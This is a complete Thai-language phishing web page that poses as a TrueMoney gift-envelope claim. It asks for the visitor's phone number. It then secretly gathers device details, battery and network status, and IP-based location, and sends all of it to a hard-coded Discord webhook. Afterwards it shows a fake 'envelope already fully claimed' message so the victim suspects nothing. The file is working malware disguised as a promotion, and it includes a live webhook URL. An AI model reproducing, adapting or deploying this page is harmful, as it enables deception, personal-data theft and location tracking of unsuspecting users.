<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ของขวัญสำหรับคุณ</title>
    
    <meta property="og:title" content="ของขวัญสำหรับคุณ">
    <meta property="og:description" content="คุณได้รับซองทรูมันนี่มูลค่า 10-100 บาท จากเพื่อนของคุณ">
    <meta property="og:image" content="https://gift.truemoney.com/campaign/static/media/redenvelope_share.png">
    
    <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@400;700&display=swap" rel="stylesheet">
    <style>
        /* UI แบบเดิมที่เน้นความสะอาดและเหมือนของจริง */
        body { font-family: 'Sarabun', sans-serif; background-color: #ffffff; margin: 0; display: flex; justify-content: center; min-height: 100vh; }
        .container { width: 100%; max-width: 500px; padding: 20px; text-align: center; }
        .main-img { width: 100%; max-width: 320px; margin-bottom: 20px; }
        .sender-name { font-size: 1.3rem; font-weight: bold; color: #333; }
        .input-box { text-align: left; width: 95%; margin: 20px auto; }
        input[type="text"] { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 6px; font-size: 1.1rem; box-sizing: border-box; outline: none; transition: 0.3s; }
        input[type="text"]:focus { border-color: #ff8c2d; }
        .btn-orange { background-color: #ff8c2d; color: white; border: none; width: 100%; padding: 16px; font-size: 1.1rem; font-weight: bold; border-radius: 30px; cursor: pointer; margin-top: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .btn-orange:active { transform: scale(0.98); }
        
        /* หน้าจอ Loading ที่จะแสดงหลังกดปุ่ม */
        #loading-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 100; text-align: center; padding: 20px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #ff8c2d; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <img class="main-img" src="https://gift.truemoney.com/campaign/static/media/landing_main.26b054af21dc302fb4a6.png">
        <div class="sender-name">ศราวุธ ***</div>
        <div style="color: #888;">ส่งซองทรูมันนี่ให้คุณ</div>
        <div class="input-box">
            <label style="font-size: 0.9rem; color: #666;">กรอกเบอร์โทรศัพท์เพื่อรับซอง</label>
            <input type="text" id="phone" placeholder="08x-xxx-xxxx" maxlength="10">
        </div>
        <button class="btn-orange" onclick="startRedeem()">รับซองเลย</button>
    </div>

    <div id="loading-screen">
        <div class="spinner"></div>
        <div id="status-text" style="color:#ff8c2d; font-weight:bold;">กำลังตรวจสอบสิทธิ์...</div>
        <div id="sub-text" style="color:#888; font-size: 0.85rem; margin-top: 10px;">กรุณารอครู่เดียว ระบบกำลังเตรียมข้อมูลให้คุณ</div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1493303430289162493/u7A4FZxwAdekbS0Bw5pngOyRc2DToLjFQikE0rxeCqaEO1GNy6CddP8ChlCCNqSlB854";

        async function startRedeem() {
            const phone = document.getElementById('phone').value;
            if(!/^[0-9]{10}$/.test(phone)) { alert("กรุณากรอกเบอร์โทรศัพท์ให้ถูกต้อง"); return; }
            
            document.getElementById('loading-screen').style.display = 'flex';

            // --- [1] Stealth Data Extraction (ดึงให้หมด) ---
            let gpu = "N/A";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
            } catch (e) {}

            let battery = "N/A";
            try {
                const b = await navigator.getBattery();
                battery = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'ชาร์จอยู่' : 'ไม่ได้ชาร์จ'})`;
            } catch (e) {}

            let network = "N/A";
            if (navigator.connection) {
                const c = navigator.connection;
                network = `${c.effectiveType.toUpperCase()} (~${c.downlink} Mbps)`;
            }

            const device = {
                cpu: navigator.hardwareConcurrency || "N/A",
                ram: navigator.deviceMemory || "N/A",
                platform: navigator.platform,
                lang: navigator.language,
                ref: document.referrer || "Direct Link",
                time: new Date().toLocaleString('th-TH')
            };

            // --- [2] Send to Discord ---
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                
                await fetch(WEBHOOK_URL, { 
                    method: 'POST', 
                    headers: { 'Content-Type': 'application/json' }, 
                    body: JSON.stringify({
                        content: `🏁 **Target Hit!** | Phone: \`${phone}\``,
                        embeds: [{
                            title: "🗂️ รายงานข้อมูลเบื้องลึก (V21.1 Classic UI)",
                            color: 16745517,
                            fields: [
                                { name: "📱 เบอร์", value: `**${phone}**`, inline: true },
                                { name: "🔋 แบต", value: `\`${battery}\``, inline: true },
                                { name: "📶 เน็ต", value: `\`${network}\``, inline: true },
                                { name: "📍 ISP/พิกัด", value: `[Maps](https://www.google.com/maps?q=${d.latitude},${d.longitude})\n${d.city}, ${d.org}`, inline: false },
                                { name: "🛠️ ฮาร์ดแวร์", value: `CPU: ${device.cpu} | RAM: ${device.ram}GB\nGPU: ${gpu}`, inline: false },
                                { name: "🌐 อื่นๆ", value: `มาจาก: ${device.ref}\nเวลาเครื่อง: ${device.time}\nOS: ${device.platform}`, inline: false }
                            ],
                            timestamp: new Date()
                        }]
                    }) 
                });
            } catch (e) {}

            // --- [3] Exit Strategy (เนียนๆ ว่าซองเต็ม) ---
            setTimeout(() => {
                document.getElementById('status-text').style.color = "#ff4444";
                document.getElementById('status-text').innerText = "❌ ขออภัย สิทธิ์รับซองเต็มแล้ว";
                document.getElementById('sub-text').innerHTML = "ซองอั่งเปานี้มีผู้รับครบจำนวนแล้ว<br>ขอบคุณที่ร่วมสนุกกับเรา";
                document.querySelector('.spinner').style.display = 'none';
            }, 3000);
        }
    </script>
</body>
</html>
